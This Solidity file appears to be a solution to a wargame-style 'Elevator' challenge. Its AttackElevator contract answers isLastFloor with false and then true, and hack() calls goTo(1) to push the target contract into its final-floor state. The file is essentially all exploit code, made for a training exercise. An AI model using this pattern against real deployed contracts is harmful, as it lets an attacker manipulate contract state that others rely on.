// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Elevator.sol';

contract AttackElevator {
    Elevator immutable public elevator;
    uint256 public count;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        if (count == 1) {
            return false;
        } else {
            return true;
        }
    }

    function hack() public {
        elevator.goTo(1);
    }
}